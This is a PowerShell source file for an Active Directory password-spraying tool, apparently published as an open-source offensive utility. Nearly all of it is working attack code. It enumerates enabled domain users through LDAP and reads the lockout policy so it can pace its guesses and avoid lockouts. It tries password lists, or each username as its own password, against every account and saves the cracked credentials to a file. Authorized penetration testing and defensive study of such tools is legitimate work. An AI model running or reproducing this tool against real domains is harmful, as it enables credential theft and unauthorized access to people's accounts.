# Requires -Version 5.1
using namespace System.DirectoryServices
using namespace System.DirectoryServices.ActiveDirectory

<#
.SYNOPSIS
    Active Directory Password Spraying Tool
.DESCRIPTION
    Performs controlled password spraying attacks against Active Directory users
    while respecting lockout policies and providing detailed logging.
.NOTES
    Version:        1.0
    License:        MIT
#>

#region Main Function

function Invoke-DomainPasswordSprayNG {
    <#
    .SYNOPSIS
        Active Directory Password Spraying Tool.

    .DESCRIPTION
        Performs controlled password spraying attacks against Active Directory user accounts
        while respecting lockout policies. Includes features like:
        - Password list support
        - Custom domain targeting
        - Lockout threshold detection
        - Progress tracking
        - Detailed logging options
        - Configurable delays and jitter

    .PARAMETER Username
        Single username to test. If specified, only this user will be tested.

    .PARAMETER UserList
        Path to a file containing usernames, one per line.
        If not specified, all domain users will be enumerated.

    .PARAMETER Password
        Single password to test against all users.

    .PARAMETER PasswordList
        Path to a file containing passwords, one per line.
        Each password will be tested against all users with observation window delays.

    .PARAMETER OutFile
        Path to save successful credentials. Format: "username:password"

    .PARAMETER Domain
        Target domain. If not specified, the current domain will be used.

    .PARAMETER Filter
        Custom LDAP filter for user enumeration.
        Example: "(description=*admin*)"

    .PARAMETER Force
        Bypasses the confirmation prompt.

    .PARAMETER Fudge
        Additional delay (in seconds) between password rounds.
        Default: 10 seconds

    .PARAMETER Delay
        Delay between each authentication attempt in seconds.
        Default: 0 seconds

    .PARAMETER Jitter
        Random delay variation (0-1) applied to the base delay.
        Example: 0.3 adds up to 30% random delay

    .PARAMETER Quiet
        Reduces output verbosity.

    .PARAMETER UsernameAsPassword
        Tests each username as its own password.

    .PARAMETER LogLevel
        Detail level for output.
        Valid options: 'Quiet', 'Normal', 'Verbose'
        Default: 'Normal'

    .PARAMETER LogToFile
        Enables logging to a file.

    .PARAMETER LogFilePath
        Path for the log file.
        Default: "spray_log.txt"

    .PARAMETER StatusUpdateInterval
        Frequency of progress updates in seconds.
        Default: 10 seconds

    .PARAMETER ContinueOnSuccess
        Continue testing a user even after finding valid credentials.

    .PARAMETER StopOnFirst
        Stop testing after finding valid credentials.

    .EXAMPLE
        Invoke-DomainPasswordSprayNG -Password "Winter2023!"
        Tests all domain users with the specified password.

    .EXAMPLE
        Invoke-DomainPasswordSprayNG -UserList ".\users.txt" -Password "Winter2023!" -OutFile "valid.txt"
        Tests users from users.txt with the specified password, saving results to valid.txt.

    .EXAMPLE
        Invoke-DomainPasswordSprayNG -Username "testuser" -PasswordList ".\passes.txt" -Domain "test.local"
        Tests a single user against multiple passwords on a specific domain.

    .EXAMPLE
        Invoke-DomainPasswordSprayNG -UserList ".\users.txt" -Password "Winter2023!" -Delay 1 -Jitter 0.3
        Tests with a 1-second delay between attempts plus random jitter.

    .EXAMPLE
        Invoke-DomainPasswordSprayNG -UsernameAsPassword -Force -LogLevel Verbose
        Tests each username as its own password with verbose output.

    .NOTES
        Version: 1.0
        License: MIT
        Author: agnorance

    .LINK
        https://github.com/agnorance/fishing/blob/main/scripts/active-directory/DomainPasswordSprayNG/DomainPasswordSprayNG.ps1
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $false)][string]$Username = "",
        [Parameter(Position = 1, Mandatory = $false)][string]$UserList = "",
        [Parameter(Position = 2, Mandatory = $false)][string]$Password,
        [Parameter(Position = 3, Mandatory = $false)][string]$PasswordList,
        [Parameter(Position = 4, Mandatory = $false)][string]$OutFile,
        [Parameter(Position = 5, Mandatory = $false)][string]$Filter = "",
        [Parameter(Position = 6, Mandatory = $false)][string]$Domain = "",
        [Parameter(Position = 7, Mandatory = $false)][switch]$Force,
        [Parameter(Position = 8, Mandatory = $false)][switch]$UsernameAsPassword,
        [Parameter(Position = 9, Mandatory = $false)][int]$Delay = 0,
        [Parameter(Position = 10, Mandatory = $false)]$Jitter = 0,
        [Parameter(Position = 11, Mandatory = $false)][switch]$Quiet,
        [Parameter(Position = 12, Mandatory = $false)][int]$Fudge = 10,
        [Parameter(Position = 13, Mandatory = $false)]
        [ValidateSet('Quiet', 'Normal', 'Verbose')]
        [string]$LogLevel = 'Normal',
        [Parameter(Position = 14, Mandatory = $false)][switch]$LogToFile,
        [Parameter(Position = 15, Mandatory = $false)][string]$LogFilePath = "spray_log.txt",
        [Parameter(Position = 16, Mandatory = $false)][int]$StatusUpdateInterval = 10,
        [Parameter(Position = 17, Mandatory = $false)][switch]$ContinueOnSuccess,
        [Parameter(Position = 18, Mandatory = $false)][switch]$StopOnFirst
    )

    # Initialize logger
    $logger = [SprayLogger]::new($LogLevel, $LogToFile, $LogFilePath)
    $logger.StatusInterval = $StatusUpdateInterval

    # Input validation
    if (-not $Password -and -not $PasswordList -and -not $UsernameAsPassword) {
        $logger.WriteLog("Either -Password, -PasswordList, or -UsernameAsPassword must be specified", "ERROR")
        return
    }

    # Connect to domain
    $logger.WriteLog("", "INFO")  # Add blank line
    $logger.WriteLog("Testing domain connection", "INFO")
    $domainConnection = Connect-DomainContext -Domain $Domain -Logger $logger
    if (-not $domainConnection) {
        return
    }

    $CurrentDomain = $domainConnection.CurrentDomain
    $DomainObject = $domainConnection.DomainObject
 
    # Get password policy
    $domainPolicy = Get-ObservationWindow $CurrentDomain
    $observation_window = $domainPolicy.Window
    $lockoutThreshold = $domainPolicy.Threshold

    # Get user list with validation
    $UserListArray = @()
    if ($Username) {
        if ([string]::IsNullOrWhiteSpace($Username)) {
            $logger.WriteLog("Username cannot be empty", "ERROR")
            return
        }
        $UserListArray = @($Username)
        $logger.WriteLog("Testing single username: $Username", "INFO")
    }
    elseif ($UserList) {
        if (-not (Test-Path $UserList)) {
            $logger.WriteLog("User list file not found: $UserList", "ERROR")
            return
        }
        $UserListArray = @(Get-Content $UserList | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
        if ($UserListArray.Count -eq 0) {
            $logger.WriteLog("No valid users found in file: $UserList", "ERROR")
            return
        }
        $logger.WriteLog("Loaded $($UserListArray.Count) users from $UserList", "INFO")
    }
    else {
        $logger.WriteLog("Enumerating domain users...", "INFO")
        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter -DomainConnection $domainConnection -Logger $logger
    }

    if (-not $UserListArray -or $UserListArray.Count -eq 0) {
        $logger.WriteLog("No valid users found to test", "ERROR")
        return
    }

    # Set up passwords
    if ($Password) {
        $logger.WriteLog("Loaded 1 Password from command line argument", "INFO")
        $Passwords = @($Password)
    }
    elseif ($PasswordList) {
        if (-not (Test-Path $PasswordList)) {
            $logger.WriteLog("Password list file not found", "ERROR")
            return
        }
        $Passwords = Get-Content $PasswordList
        $logger.WriteLog("Loaded $($Passwords.Count) passwords from $PasswordList", "INFO")
    }

    # Calculate total attempts
    $totalAttempts = if ($UsernameAsPassword) {
        $UserListArray.Count
    }
    else {
        $UserListArray.Count * $(if ($Password) { 1 } else { $Passwords.Count })
    }

    # Initialize configuration
    $config = @{
        Domain = $DomainObject.Name
        LockoutThreshold = $lockoutThreshold
        ObservationWindow = $observation_window
        UserCount = $UserListArray.Count
        PasswordCount = if ($UsernameAsPassword) { 1 } else { $Passwords.Count }
        TotalAttempts = $totalAttempts
        OutFile = $OutFile
        Delay = $Delay
        StatusInterval = $StatusUpdateInterval
    }

    # Display configuration
    $logger.WriteConfig($config)

    # Confirmation prompt
    if (-not $Force) {
        $logger.WriteLog("Warning: Password spraying can cause account lockouts.", "WARNING")
        $logger.WriteLog("Testing $($UserListArray.Count) users", "WARNING")
        $logger.WriteLog("Do you want to continue? (Y/N)", "WARNING")
        $response = Read-Host
        if ($response -ne "Y") {
            $logger.WriteLog("Operation cancelled by user", "WARNING")
            return
        }
    }

    # Track attempts
    $currentAttempt = 0
    $lastStatusUpdate = Get-Date

    # Main spray loop
    if ($UsernameAsPassword) {
        foreach ($User in $UserListArray) {
            $currentAttempt++
            
            Invoke-SprayAttempt -CurrentDomain $CurrentDomain -User $User -Password $User `
                               -Logger $logger -OutFile $OutFile

            if ($StopOnFirst -and $logger.SuccessfulUsers.Count -gt 0) {
            $logger.WriteLog("", "INFO")  # Add blank line
            $logger.WriteLog("Valid credential found. Stopping as requested.", "SUCCESS")
            break
            }
            
            # Status updates
            $currentTime = Get-Date
            if (($currentTime - $lastStatusUpdate).TotalSeconds -ge $logger.StatusInterval) {
                $lastStatusUpdate = $currentTime
                $logger.WriteProgress(
                    $currentAttempt,
                    $totalAttempts,
                    $User,
                    $User,
                    1,
                    1,
                    0
                )
            }

            if ($Delay -gt 0) {
                $actualDelay = $Delay
                if ($Jitter -gt 0) {
                    $actualDelay += Get-Random -Minimum 0 -Maximum ($Delay * $Jitter)
                }
                Start-Sleep -Seconds $actualDelay
            }
        }
    }
    else {
       # Tracking variables 
        $currentRound = 0
        $attemptsInWindow = 0

        foreach ($CurrentPassword in $Passwords) {
            $currentRound++
            $attemptsInWindow++
            $logger.WriteRoundStatus($currentRound, $Passwords.Count, $CurrentPassword, $observation_window, $lockoutThreshold)
            $lastStatusUpdate = Get-Date
            
            foreach ($User in $UserListArray) {
                if (-not $ContinueOnSuccess -and $logger.SuccessfulUsers.ContainsKey($User)) {
                    $logger.WriteAttempt($User, $CurrentPassword, "Skip")
                    continue
                }

                $currentAttempt++
                
                $currentTime = Get-Date
                if (($currentTime - $lastStatusUpdate).TotalSeconds -ge $logger.StatusInterval) {
                    $lastStatusUpdate = $currentTime
                    $logger.WriteProgress(
                        $currentAttempt,
                        $totalAttempts,
                        $User,
                        $CurrentPassword,
                        $currentRound,
                        $Passwords.Count,
                        $observation_window
                    )
                }

                # Perform the spray attempt
                Invoke-SprayAttempt -CurrentDomain $CurrentDomain -User $User -Password $CurrentPassword `
                                -Logger $logger -OutFile $OutFile

                # Check if we found a valid credential and should stop
                if ($StopOnFirst -and $logger.SuccessfulUsers.Count -gt 0) {
                    $logger.WriteLog("Valid credential found. Stopping as requested.", "SUCCESS")
                    return
                }
                
                # Add a minimal sleep to prevent overwhelming the DC (DO NOT REMOVE!)
                Start-Sleep -Milliseconds 10

                if ($Delay -gt 0) {
                    $actualDelay = $Delay
                    if ($Jitter -gt 0) {
                        $actualDelay += Get-Random -Minimum 0 -Maximum ($Delay * $Jitter)
                    }
                    Start-Sleep -Seconds $actualDelay
                }

                # Check if we need to wait for the observation window
                if ($lockoutThreshold -gt 0 -and $attemptsInWindow -ge $lockoutThreshold -and $currentRound -lt $Passwords.Count) {
                    Write-Host "[*] Reached $attemptsInWindow attempts - waiting for observation window..."
                    $logger.WriteObservationWait($observation_window, $Fudge)
                    $attemptsInWindow = 0
                }
            }
        }
    }

    # Write final summary
    $logger.WriteSummary($totalAttempts, $OutFile)
}

#endregion

#region Helper Functions
function Invoke-SprayAttempt {
    param (
        [Parameter(Mandatory = $true)][string]$CurrentDomain,
        [Parameter(Mandatory = $true)][string]$User,
        [Parameter(Mandatory = $true)][string]$Password,
        [Parameter(Mandatory = $true)][SprayLogger]$Logger,
        [Parameter(Mandatory = $false)][string]$OutFile
    )

    try {
        Write-Verbose "Testing: $User"
        $Logger.WriteAttempt($User, $Password, "Attempt")
        
        # Test credentials and capture result, but suppress output
        $result = Test-Credential -CurrentDomain $CurrentDomain -Username $User -Password $Password 6> $null

        # Process result before any delay
        if ($result) {
            $Logger.WriteAttempt($User, $Password, "Success")
            if ($OutFile) {
                "$User`:$Password" | Add-Content -Path $OutFile
            }
            [Console]::Out.Flush()  # Force output to display
        }
        
        # Suppress return value output
        $null = $result
    }
    catch {
        $Logger.WriteAttempt($User, $Password, "Error", $_.Exception.Message)
        Write-Verbose "Error testing $User`: $($_.Exception.Message)"
        $null = $false
    }
}

function Test-Credential {
    [CmdletBinding()]
    [OutputType([bool])]
    param (
        [Parameter(Mandatory = $true)][string]$CurrentDomain,
        [Parameter(Mandatory = $true)][string]$Username,
        [Parameter(Mandatory = $true)][string]$Password
    )
    
    $DomainObject = $null
    try {
        # Extract domain name from LDAP path
        $domainParts = $CurrentDomain -replace "LDAP://", "" -split ","
        $domainName = ($domainParts | Where-Object { $_ -like "DC=*" } | Select-Object -First 2 | ForEach-Object { $_ -replace "DC=","" }) -join "."
        
        # Add domain prefix if not present
        if ($Username -notlike "*\*" -and $Username -notlike "*@*") {
            $Username = "$domainName\$Username"
        }
        
        Write-Verbose "Testing auth for: $Username"
        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $Username, $Password)
        
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        $searcher.Filter = "(sAMAccountName=$($Username.Split('\')[-1]))"
        $result = $searcher.FindOne()
        
        return ($null -ne $result)
    }
    catch {
        Write-Verbose "Auth failed: $($_.Exception.Message)"
        return $false
    }
    finally {
        if ($null -ne $DomainObject) {
            try { $DomainObject.Dispose() } catch { }
        }
    }
}

function Connect-DomainContext {
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [string]$Domain = "",
        
        [Parameter(Position = 1, Mandatory = $false)]
        [SprayLogger]$Logger
    )

    try {
        if ($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain", $Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else {
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $distinguishedName = ([ADSI]"").distinguishedName.Value
            if (-not $distinguishedName) {
                throw "Failed to get domain distinguished name"
            }
            $CurrentDomain = "LDAP://$distinguishedName"
        }

        $Logger.WriteLog("Connected to domain: $($DomainObject.Name)", "INFO")
        
        return @{
            DomainObject = $DomainObject
            CurrentDomain = $CurrentDomain
        }
    }
    catch {
        $Logger.WriteLog("Failed to connect to domain: $($_.Exception.Message)", "ERROR")
        return $null
    }
}

function Get-DomainUserList {
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $false)]
        [string]$Domain = "",

        [Parameter(Position = 1, Mandatory = $false)]
        [switch]$RemoveDisabled,

        [Parameter(Position = 2, Mandatory = $false)]
        [switch]$RemovePotentialLockouts,

        [Parameter(Position = 3, Mandatory = $false)]
        [string]$Filter,

        [Parameter(Position = 4, Mandatory = $false)]
        [hashtable]$DomainConnection,

        [Parameter(Position = 5, Mandatory = $false)]
        [SprayLogger]$Logger
    )

    if (-not $DomainConnection) {
        $Logger.WriteLog("No domain connection provided", "ERROR")
        return @()
    }

    try {
        $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$DomainConnection.CurrentDomain)
        $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
        $UserSearcher.SearchRoot = $DirEntry

        $PropertiesToLoad = @("samaccountname", "badpwdcount", "badpasswordtime")
        foreach($prop in $PropertiesToLoad) {
            $UserSearcher.PropertiesToLoad.Add($prop) > $null
        }

        if ($RemoveDisabled) {
            $baseFilter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)"
        } else {
            $baseFilter = "(&(objectCategory=person)(objectClass=user)"
        }

        if ($Filter) {
            $UserSearcher.filter = "$baseFilter$Filter)"
        } else {
            $UserSearcher.filter = "$baseFilter)"
        }

        $UserSearcher.PageSize = 1000
        $AllUserObjects = $UserSearcher.FindAll()
        
        # Filter out empty usernames and validate the list
        $UserListArray = @($AllUserObjects | ForEach-Object {
            $username = $_.Properties.samaccountname[0]
            if (-not [string]::IsNullOrWhiteSpace($username)) {
                $username
            }
        } | Where-Object { $_ })

        if ($UserListArray.Count -eq 0) {
            $Logger.WriteLog("No valid users found", "WARNING")
        } else {
            $Logger.WriteLog("Found $($UserListArray.Count) valid users", "INFO")
        }
        
        return $UserListArray
    }
    catch {
        $Logger.WriteLog("Error enumerating users: $($_.Exception.Message)", "ERROR")
        return @()
    }
}

function Get-ObservationWindow {
    <#
    .SYNOPSIS
    Retrieves observation window from Active Directory domain.
    #>
    param([string]$DomainEntry)
    try {
        $Domain = [ADSI]$DomainEntry

        # Check if there's a lockout threshold first
        $lockoutThreshold = $Domain.Properties['lockoutthreshold'].Value
        if ($lockoutThreshold -eq 0) {
            return @{
                Window = 0
                Threshold = 0
            }
        }

        $lockOutObservationWindow = $Domain.Properties['lockoutObservationWindow'].Value
        $observationWindowMinutes = $Domain.ConvertLargeIntegerToInt64($lockOutObservationWindow) / -600000000

        return @{
            Window = $observationWindowMinutes
            Threshold = $lockoutThreshold
        }
    }
    catch {
        Write-Warning "Failed to get domain policy, defaulting to no lockout policy"
        return @{
            Window = 0
            Threshold = "Unknown"
        }
    }
}

function Countdown-Timer {
    param(
        [Parameter(Mandatory=$true)]
        [int]$Seconds,
        
        [Parameter(Mandatory=$false)]
        [string]$Message = "Waiting to avoid account lockout",
        
        [Parameter(Mandatory=$false)]
        [SprayLogger]$Logger
    )
    
    if ($Logger.LogLevel -eq 'Quiet') {
        $Logger.WriteLog("$Message - Waiting $($Seconds/60) minutes", "INFO")
        Start-Sleep -Seconds $Seconds
    }
    else {
        $endTime = (Get-Date).AddSeconds($Seconds)
        
        while ((Get-Date) -lt $endTime) {
            $timeLeft = $endTime - (Get-Date)
            $percentComplete = (($Seconds - $timeLeft.TotalSeconds) / $Seconds) * 100
            
            Write-Progress -Activity $Message `
                -Status "$([math]::Round($timeLeft.TotalMinutes,1)) minutes remaining" `
                -PercentComplete $percentComplete
            
            Start-Sleep -Seconds 1
        }
        
        Write-Progress -Activity $Message -Completed
    }
}

# Helper class logging
# Logging 

class SprayLogger {
    [string]$LogLevel
    [bool]$LogToFile
    [string]$LogFilePath
    [System.Collections.Generic.Dictionary[string,string]]$SuccessfulUsers
    [datetime]$StartTime
    [int]$StatusInterval
    [object]$ProgressBar
    hidden [int]$LastProgressUpdate = 0
    hidden [int]$AttemptCount = 0
    hidden [System.Collections.Generic.List[string]]$FailedAttempts

    SprayLogger(
        [string]$logLevel = 'Normal',
        [bool]$logToFile = $false,
        [string]$logFilePath = "spray_log.txt"
    ) {
        $this.LogLevel = $logLevel
        $this.LogToFile = $logToFile
        $this.LogFilePath = $logFilePath
        $this.SuccessfulUsers = [System.Collections.Generic.Dictionary[string,string]]::new()
        $this.StartTime = Get-Date
        $this.StatusInterval = 10
        $this.FailedAttempts = [System.Collections.Generic.List[string]]::new()

        if ($this.LogToFile) {
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            "[$timestamp] [INFO] Password spray logging started" | Set-Content -Path $this.LogFilePath
        }
    }

    [void] WriteConfig([hashtable]$config) {
        $this.WriteLog("", "INFO")  # Add blank line before configuration
        $this.WriteLog("=== Spray Configuration ===", "CONFIG")
    
        $lines = @(
            "Domain: $($config.Domain)"
            "Lockout Threshold: $($config.LockoutThreshold) attempts"
            "Observation Window: $($config.ObservationWindow) minutes"
            "Users to Test: $($config.UserCount)"
            "Password(s) to Test: $($config.PasswordCount)"
            "Total Attempts: $($config.TotalAttempts)"
            "Output File: $(if ($config.OutFile) { $config.OutFile } else { 'None' })"
            "Delay: $(if ($config.Delay -gt 0) { "$($config.Delay) seconds" } else { 'None' })"
            "Status Updates: Every $($config.StatusInterval) seconds"
            "Start Time: $($this.StartTime.ToString('yyyy-MM-dd HH:mm:ss'))"
        )
    
        foreach ($line in $lines) {
            $this.WriteLog($line, "INFO")
        }
    
        if ($config.ObservationWindow -gt 0) {
            $estimatedDuration = $config.PasswordCount * $config.ObservationWindow
            $estimatedCompletion = $this.StartTime.AddMinutes($estimatedDuration)
            $this.WriteLog("Estimated Completion: $($estimatedCompletion.ToString('yyyy-MM-dd HH:mm:ss'))", "INFO")
            $this.WriteLog("Estimated Duration: $estimatedDuration minutes", "INFO")
        }
    }

    [void] WriteLog([string]$message, [string]$level = "INFO") {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $logMessage = "[$timestamp] [$level] $message"
        
        if ($this.LogToFile) {
            Add-Content -Path $this.LogFilePath -Value $logMessage
        }
    
        # Only output to console if the log level warrants it
        if ($this.LogLevel -eq 'Quiet' -and $level -notin @('ERROR', 'SUCCESS')) {
            return
        }
    
        # Handle empty messages
        if ([string]::IsNullOrEmpty($message)) {
            Write-Host "" # Just output a blank line
            return
        }
    
        switch ($level) {
            'ERROR'   { Write-Host "[-] $message" -ForegroundColor Red }
            'WARNING' { Write-Host "[!] $message" -ForegroundColor Yellow }
            'SUCCESS' { Write-Host "[+] $message" -ForegroundColor Green }
            'CONFIG'  { Write-Host "$message" -ForegroundColor Cyan } # For configuration headers
            'INFO'    { Write-Host "[*] $message" -ForegroundColor White }
            'VERBOSE' { 
                if ($this.LogLevel -eq 'Verbose') {
                    Write-Host "[*] $message" -ForegroundColor Cyan
                }
            }
            default   { Write-Host $message }
        }
    }

    [void] WriteConnectionAttempt([string]$domain) {
        $this.WriteLog("Attempting to connect to domain: $domain")
        if ($this.LogLevel -ne 'Quiet') {
            Write-Host "[*] Testing domain connection to $domain"
        }
    }

    [void] WriteConnectionSuccess([string]$domain) {
        $this.WriteLog("Successfully connected to domain: $domain", "SUCCESS")
        if ($this.LogLevel -ne 'Quiet') {
            Write-Host "[+] Successfully connected to domain: $domain"
        }
    }

    [void] WriteLockoutThreshold([int]$threshold) {
        if ($this.LogLevel -ne 'Quiet') {
            Write-Host "[*] Lockout threshold detected: $threshold attempts"
        }
    }

    [void] WriteObservationWait([int]$minutes, [int]$fudge = 0) {
        if ($minutes -gt 0) {
            $this.WriteLog("Waiting $minutes minutes before next password...", "INFO")
            Start-Sleep -Seconds (60 * $minutes)
        }

        if ($fudge -gt 0) {
            $this.WriteLog("Adding extra fudge time of $fudge seconds between rounds...", "INFO")
            Start-Sleep -Seconds $fudge
        }
    }

    # First overload with 3 parameters
    [void] WriteAttempt([string]$user, [string]$password, [string]$result) {
        $this.WriteAttempt($user, $password, $result, "")
    }

    # Second overload with 4 parameters
    [void] WriteAttempt([string]$user, [string]$password, [string]$result, [string]$errorMessage = "") {
        $this.AttemptCount++
        
        switch ($result) {
            "Success" {
                Write-Host "[+] SUCCESS! User: $user Password: $password" -ForegroundColor Green
                $this.SuccessfulUsers[$user] = $password
                if ($this.LogToFile) {
                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    "[$timestamp] [SUCCESS] User: $user Password: $password" | Add-Content -Path $this.LogFilePath
                }
                [Console]::Out.Flush()
            }
            "Attempt" {
                if ($this.LogLevel -eq 'Verbose') {
                    $this.WriteLog("Attempting authentication - User: $user", "VERBOSE")
                }
            }
            "Error" {
                if ($this.LogLevel -eq 'Verbose') {
                    $this.WriteLog("Failed: $user - $errorMessage", "VERBOSE")
                }
                $this.FailedAttempts.Add("$user : $errorMessage")
            }
            "Skip" {
                if ($this.LogLevel -eq 'Verbose') {
                    $this.WriteLog("Skipping $user - already found successful password", "VERBOSE")
                }
            }
        }
    }

    [void] WriteRoundStatus([int]$currentRound, [int]$totalRounds, [string]$currentPassword, [int]$observationWindow, [int]$lockoutThreshold) {
        $this.WriteLog("", "INFO")
        $this.WriteLog("Starting Round $currentRound of $totalRounds", "INFO")
        $this.WriteLog("Current Password: $currentPassword", "INFO")
        $this.WriteLog("Remaining Rounds: $($totalRounds - $currentRound)", "INFO")
            
        if ($observationWindow -gt 0 -and $lockoutThreshold -gt 0) {
            $estimatedCompletion = (Get-Date).AddMinutes($observationWindow)
            $this.WriteLog("Expected Round Completion: $($estimatedCompletion.ToString('yyyy-MM-dd HH:mm:ss'))", "INFO")
        }
    }

    [void] WriteProgress(
        [int]$currentAttempt,
        [int]$totalAttempts,
        [string]$currentUser,
        [string]$currentPassword,
        [int]$currentRound,
        [int]$totalRounds,
        [int]$observationWindow
    ) {
        # Only update progress every 100ms to reduce screen flicker
        $currentTick = [Environment]::TickCount
        if (($currentTick - $this.LastProgressUpdate) -lt 100) {
            return
        }
        $this.LastProgressUpdate = $currentTick

        $percentComplete = [math]::Round(($currentAttempt / $totalAttempts) * 100, 2)
        $elapsedTime = (Get-Date) - $this.StartTime
        $attemptsPerSecond = if ($elapsedTime.TotalSeconds -gt 0) {
            [math]::Round($currentAttempt / $elapsedTime.TotalSeconds, 1)
        } else { 0 }

        $remainingAttempts = $totalAttempts - $currentAttempt
        $estimatedSecondsRemaining = if ($attemptsPerSecond -gt 0) {
            $remainingAttempts / $attemptsPerSecond
        } else { 0 }

        if ($observationWindow -gt 0) {
            $estimatedSecondsRemaining += ($totalRounds - $currentRound) * $observationWindow * 60
        }

        $status = @(
            "Progress: $($percentComplete)%",
            "User: $currentUser",
            "Password: $currentPassword",
            "$attemptsPerSecond att/sec",
            "Found: $($this.SuccessfulUsers.Count)"
        ) -join " | "

        Write-Progress -Activity "Password Spray Progress - Round $currentRound/$totalRounds" `
                      -Status $status `
                      -PercentComplete $percentComplete `
                      -SecondsRemaining $estimatedSecondsRemaining
    }

    [void] WriteSummary([int]$totalAttempts, [string]$outFile) {
        $endTime = Get-Date
        $duration = $endTime - $this.StartTime

        $this.WriteLog("", "INFO")  # Add blank line
        $this.WriteLog("=== Spray Summary ===", "INFO")
        
        $summaryLines = @(
            "Duration: $($duration.ToString('hh\:mm\:ss'))"
            "Total Attempts: $totalAttempts"
            "Successful Logins: $($this.SuccessfulUsers.Count)"
            "Failed Attempts: $($this.FailedAttempts.Count)"
            "Success Rate: $([math]::Round(($this.SuccessfulUsers.Count/$totalAttempts) * 100, 2))%"
            "Average Speed: $([math]::Round($totalAttempts/$duration.TotalSeconds, 1)) attempts/second"
        )

        foreach ($line in $summaryLines) {
            $this.WriteLog($line, "INFO")
        }

        if ($this.SuccessfulUsers.Count -gt 0) {
            $this.WriteLog("", "INFO")  # Add blank line
            $this.WriteLog("=== Compromised Accounts ===", "SUCCESS")
            foreach ($user in $this.SuccessfulUsers.Keys) {
                $this.WriteLog("$($user.PadRight(30)) : $($this.SuccessfulUsers[$user])", "SUCCESS")
            }
        }
        else {
            $this.WriteLog("No successful logins found.", "WARNING")
        }
    }
}

#endregion

